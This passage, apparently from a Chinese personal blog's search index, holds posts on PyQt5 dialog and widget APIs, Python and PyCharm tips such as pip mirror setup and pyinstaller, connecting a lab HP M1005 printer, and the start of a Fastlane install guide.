index,text)</td><td>改变序列号为index的文本</td></tr></tbody></table><p>QComboBox类中的常用信号</p><table><thead><tr><th>信号</th><th>含义</th></tr></thead><tbody><tr><td>Activated</td><td>当用户选中一个下拉选项时发射该信号</td></tr><tr><td>—</td><td>—</td></tr><tr><td>currentIndexChanged</td><td>当下拉选项的索引发生改变时发射该信号</td></tr><tr><td>highlighted</td><td>当选中一个已经选中的下拉选项时，发射该信号</td></tr></tbody></table><p>QSPinBox<br>QSlider</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">void  setTickPosition(TickPosition position)  #设置刻度的位置，位置还决定了slider 的方向</span><br><span class="line">void  setTickInterval(int ti) #设置刻度的间隔</span><br></pre></td></tr></table></figure><p>QDialog</p><p>一共有四种对话框<br>QMessageBox，QFileDialog，QColorDialog，QFontDialog，QInputDialog</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>setWindowTitle()</td><td>设置对话框标题</td></tr><tr><td>—</td><td>—</td></tr><tr><td>setWindowModality()</td><td>设置窗口模态，取值如下</td></tr><tr><td></td><td>Qt.NonModal：非模态，可以和程序的其他窗口进行交互</td></tr><tr><td></td><td>Qt.WindowModal:窗口模态，程序在未处理玩当前对话框时，将阻止和对话框的父窗口进行交互</td></tr><tr><td></td><td>Qt.ApplicationModal：应用程序模态，阻止和任何其他窗口进行交互</td></tr></tbody></table><p>QMessageBox</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">reply = QMessageBox.information(self, <span class="string">'标题'</span>,<span class="string">'消息对话框正文'</span>,QMessageBox.Yes | QMessageBox.No,QMessageBox.Yes)</span><br><span class="line">        reply1 = QMessageBox.question(self, <span class="string">"标题"</span>, <span class="string">"提问框消息正文"</span>, QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)</span><br><span class="line">        reply2 = QMessageBox.warning(self, <span class="string">"标题"</span>, <span class="string">"警告框消息正文"</span>, QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)</span><br><span class="line">        reply3 = QMessageBox.critical(self, <span class="string">"标题"</span>, <span class="string">"严重错误对话框消息正文"</span>, QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)</span><br><span class="line">        reply4 = QMessageBox.about(self, <span class="string">"标题"</span>, <span class="string">"关于对话框消息正文"</span>)</span><br></pre></td></tr></table></figure><p>QInputDialog</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">items=(<span class="string">'C'</span>,<span class="string">'C++'</span>,<span class="string">'C#'</span>,<span class="string">'JAva'</span>,<span class="string">'Python'</span>)</span><br><span class="line">item,ok=QInputDialog.getItem(self,<span class="string">"select input dialog"</span>,<span class="string">'语言列表'</span>,items,<span class="number">0</span>,<span class="literal">False</span>)</span><br><span class="line">text,ok=QInputDialog.getText(self,<span class="string">'Text Input Dialog'</span>,<span class="string">'输入姓名：'</span>)</span><br><span class="line">num,ok=QInputDialog.getInt(self,<span class="string">'Integer input dualog'</span>,<span class="string">'输入数字'</span>)</span><br></pre></td></tr></table></figure><p>QFontDialog</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">font,ok=QFontDialog.getFont()</span><br></pre></td></tr></table></figure><p>QFileDialog</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fname,_=QFileDialog.getOpenFileName(self,<span class="string">'Open file'</span>,<span class="string">'C:\\'</span>,<span class="string">'Image files (*.jpg *.gif *.png *.jpeg)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取多个文件</span></span><br><span class="line"> <span class="comment">#实例化QFileDialog</span></span><br><span class="line">        dig=QFileDialog()</span><br><span class="line">        <span class="comment">#设置可以打开任何文件</span></span><br><span class="line">        dig.setFileMode(QFileDialog.AnyFile)</span><br><span class="line">        <span class="comment">#文件过滤</span></span><br><span class="line">        dig.setFilter(QDir.Files)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> dig.exec_():</span><br><span class="line">            <span class="comment">#接受选中文件的路径，默认为列表</span></span><br><span class="line">            filenames=dig.selectedFiles()</span><br><span class="line">            <span class="comment">#列表中的第一个元素即是文件路径，以只读的方式打开文件</span></span><br><span class="line">            f=open(filenames[<span class="number">0</span>],<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> f:</span><br><span class="line">                <span class="comment">#接受读取的内容，并显示到多行文本框中</span></span><br><span class="line">                data=f.read()</span><br><span class="line">                self.contents.setText(data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python与Pycharm</title>
      <link href="/posts/6878adf7/"/>
      <url>/posts/6878adf7/</url>
      
        <content type="html"><![CDATA[<h2 id="pycharm"><a class="markdownIt-Anchor" href="#pycharm"></a> pycharm</h2><h3 id="1如何增加pycharm的提示"><a class="markdownIt-Anchor" href="#1如何增加pycharm的提示"></a> 1.如何增加Pycharm的提示</h3><ol><li>参数名增加类型</li><li>声明函数的时候指定返回类型</li><li>用注释的方式指定成员变量的类型</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Counter</span>:</span></span><br><span class="line">    name = <span class="literal">None</span> <span class="comment">#type: list</span></span><br><span class="line">    age = <span class="number">11</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(c: Counter)</span>-&gt;Counter:</span></span><br><span class="line">    <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><h3 id="2自动import"><a class="markdownIt-Anchor" href="#2自动import"></a> 2.自动import</h3><p><a href="https://blog.csdn.net/gaopeng0071/article/details/79402399" target="_blank" rel="noopener">《关于pycharm自动导入包快捷设置》</a><br>注意是按两次1</p><h3 id="3获取对象的属性和方法"><a class="markdownIt-Anchor" href="#3获取对象的属性和方法"></a> 3.获取对象的属性和方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dir(Object)</span><br></pre></td></tr></table></figure><h3 id="4获取方法详情"><a class="markdownIt-Anchor" href="#4获取方法详情"></a> 4.获取方法详情</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">按ctrl把鼠标放在方法上</span><br></pre></td></tr></table></figure><h3 id="5方法详情的文档书写"><a class="markdownIt-Anchor" href="#5方法详情的文档书写"></a> 5.方法详情的文档书写</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">(c,callback: typing.Callable[[str, int], str])</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    原路返回</span></span><br><span class="line"><span class="string">    :param c: 原路</span></span><br><span class="line"><span class="string">    :type c: Counter</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="comment"># return类型 会自动推断</span></span><br><span class="line"><span class="comment"># callback 可以自动推断类型</span></span><br><span class="line"><span class="comment"># 匿名函数只有lamda的形式  lamda:x,y:x+y</span></span><br></pre></td></tr></table></figure><p><code>Python Debugger</code> -&gt; <code>Collect runtime information for code insight</code> 打钩<br>调试程序一遍后<br>再次在方法上插入文档就会自动导入<br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190523171651.png" alt><br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190523171703.png" alt></p><h2 id="python"><a class="markdownIt-Anchor" href="#python"></a> python</h2><h3 id="1获取字典dict中不存在的值时出错问题"><a class="markdownIt-Anchor" href="#1获取字典dict中不存在的值时出错问题"></a> 1.获取字典dict中不存在的值时出错问题</h3> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict.get(<span class="string">"key"</span>,<span class="literal">None</span>) <span class="comment">#没有就返回None</span></span><br></pre></td></tr></table></figure><h3 id="2python中的多线程"><a class="markdownIt-Anchor" href="#2python中的多线程"></a> 2.python中的多线程</h3><p>python3线程同步，Lock、Rlock、Condition、Event、timer、local</p><p><a href="https://www.cnblogs.com/tkqasn/p/5700281.html" target="_blank" rel="noopener">《threading多线程总结》</a></p><p><a href="https://www.jianshu.com/p/191be5f10a94" target="_blank" rel="noopener">《python3线程同步，Lock、Rlock、Condition方式》</a></p><p><a href="http://www.cnblogs.com/dahuag/p/9198618.html" target="_blank" rel="noopener"> 《多线程中的 Queue队列中join()与task_done()》 </a></p><h3 id="3python中的多进程"><a class="markdownIt-Anchor" href="#3python中的多进程"></a> 3.python中的多进程</h3><p>基本和多线程差不多，但是有一个管道的概念，类似tcp那种收发信息，可以让两个进程进行通信<br><a href="https://www.cnblogs.com/kaituorensheng/p/4445418.html" target="_blank" rel="noopener">《Python多进程编程》</a></p><h3 id="4python换源"><a class="markdownIt-Anchor" href="#4python换源"></a> 4.python换源</h3><h4 id="临时使用"><a class="markdownIt-Anchor" href="#临时使用"></a> 临时使用</h4><p>可以在使用pip的时候加参数<code>-i https://pypi.tuna.tsinghua.edu.cn/simple</code></p><p>例如：<code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple gevent</code>，这样就会从清华这边的镜像去安装gevent库。</p><h4 id="永久修改"><a class="markdownIt-Anchor" href="#永久修改"></a> 永久修改</h4><p>Linux下，修改 <code>~/.pip/pip.conf</code> (没有就创建一个)， 修改 index-url至tuna，内容如下：</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>windows下，直接在user目录中创建一个pip目录，如：<code>C:\Users\xx\pip</code>，新建文件pip.ini，内容如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>或者直接使用命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h3 id="5pyqt5"><a class="markdownIt-Anchor" href="#5pyqt5"></a> 5.pyqt5</h3><p><a href="https://blog.csdn.net/qq_41377419/article/details/82379818" target="_blank" rel="noopener">《从零开始 使用PyQt5》</a></p><p><a href="https://blog.csdn.net/weixin_38226671/article/details/87351062" target="_blank" rel="noopener">《关于QTcreator总是卡死无响应解决办法》</a></p><p>换了个pyqt-tools的版本 终于不卡死了</p><p><a href="http://code.py40.com/pyqt5/18.html" target="_blank" rel="noopener">《pyqt教程》</a></p><p>信号可以有不同数量的参数，参数可以为任何类型。在一个类中，可以存在信号名相同，但参数不同的多个信号。这时的调用方式为在信号之后加方括号（[ ]） ,方括号内为接收到的数据类型。可以采用类型符号或该类型的英文字符串。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">blueb.clicked[bool].connect(self.setColor)</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_39607437/article/details/79213717" target="_blank" rel="noopener">《使用QTThread的正确方式》</a></p><p><a href="https://github.com/shenbo/runcat-pyqt5-win" target="_blank" rel="noopener">《系统托盘的一个例子》</a></p><h3 id="6pyinstaller"><a class="markdownIt-Anchor" href="#6pyinstaller"></a> 6.pyinstaller</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install pyinstaller</span><br><span class="line">pyinstaller -F -w myscript.py  #</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/5d1da5b437b7" target="_blank" rel="noopener">《Python打包工具Pyinstaller实战指南》</a></p><p><a href="https://blog.csdn.net/weixin_39000819/article/details/80942423" target="_blank" rel="noopener">《pyinstaller各种参数意思》</a></p><p><a href="https://www.landui.com/help/show-3768.html" target="_blank" rel="noopener">《pyinstaller简洁教程spec》</a></p><p><a href="https://www.oschina.net/question/941819_161672" target="_blank" rel="noopener">《PyInstaller将python脚本转成exe执行档，图标更换不了！！》</a></p><p><a href="https://blog.csdn.net/La_vie_est_belle/article/details/82260339" target="_blank" rel="noopener">《Pyinstaller打包问题之解决方案汇总》</a></p><h3 id="7python中的高级函数"><a class="markdownIt-Anchor" href="#7python中的高级函数"></a> 7.python中的高级函数</h3><p>zip()<br>map()<br>filter()<br>reduce()</p>]]></content>
      
      
      <categories>
          
          <category> 软件 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>实验室如何连接M1005打印机</title>
      <link href="/posts/32c97101/"/>
      <url>/posts/32c97101/</url>
      
        <content type="html"><![CDATA[<h2 id="1-先下载驱动"><a class="markdownIt-Anchor" href="#1-先下载驱动"></a> 1. 先下载驱动</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/15KN5bs_ZHSaAudTG4jT-RQ </span><br><span class="line">提取码：x4s9</span><br></pre></td></tr></table></figure><h2 id="2-连接打印机"><a class="markdownIt-Anchor" href="#2-连接打印机"></a> 2. 连接打印机</h2><h3 id="第一步"><a class="markdownIt-Anchor" href="#第一步"></a> 第一步</h3><p><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190517111307.png" alt></p><h3 id="第二步"><a class="markdownIt-Anchor" href="#第二步"></a> 第二步</h3><p><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190517111346.png" alt></p><h3 id="第三步"><a class="markdownIt-Anchor" href="#第三步"></a> 第三步</h3><p><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190517111419.png" alt></p><h3 id="第四步"><a class="markdownIt-Anchor" href="#第四步"></a> 第四步</h3><p><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190517111444.png" alt></p><h3 id="第五步"><a class="markdownIt-Anchor" href="#第五步"></a> 第五步</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//ZSH-PC/HP LaserJet M1005</span><br></pre></td></tr></table></figure><p>虽然很老但是将就着用吧</p><p><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190517111537.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastlane自动打包</title>
      <link href="/posts/19fab624/"/>
      <url>/posts/19fab624/</url>
      
        <content type="html"><![CDATA[<h1 id="fastlane-自动打包"><a class="markdownIt-Anchor" href="#fastlane-自动打包"></a> Fastlane 自动打包</h1><h2 id="fastlane的安装"><a class="markdownIt-Anchor" href="#fastlane的安装"></a> Fastlane的安装</h2><p>如果你单独安装过ruby(如果你能看得懂这句)，去掉sudo。如果使用系统自带的ruby，需要sudo权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[sudo] gem install fastlane</span><br></pre></td></tr></table></figure><p>初始化</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fastlane init</span><br></pre></td></tr></table></figure><p>执行完毕后会创建一个文件夹<code>fastlane</code><br>然后编辑这个文件夹中的</p>]]></content>
      
      
      <categories>
          
          <category> 软件 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
